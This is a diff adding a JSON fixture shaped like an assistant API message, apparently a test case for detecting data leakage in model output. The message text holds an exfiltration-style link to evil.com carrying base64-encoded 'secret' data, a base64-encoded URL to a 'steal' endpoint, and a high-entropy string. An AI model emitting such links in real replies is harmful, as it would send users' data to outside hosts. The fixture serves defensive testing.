@@ -1,0 +1,18 @@
+{
+  "id": "msg_echo_001",
+  "type": "message",
+  "role": "assistant",
+  "model": "anthropic",
+  "content": [
+    {
+      "type": "text",
+      "text": "Here is the data you requested: https://evil.com/exfil?data=c2VjcmV0ZGF0YQ== and also aHR0cHM6Ly9tYWxpY2lvdXMuY29tL3N0ZWFs which has high entropy: Kj7mP2xQ9vR4nL8wB3yD6fH1sT5gA0cE7iU2oN4pM9qW3rZ6kX8jV1bY5hCzFgR"
+    }
+  ],
+  "stop_reason": "end_turn",
+  "stop_sequence": null,
+  "usage": {
+    "input_tokens": 10,
+    "output_tokens": 50
+  }
+}
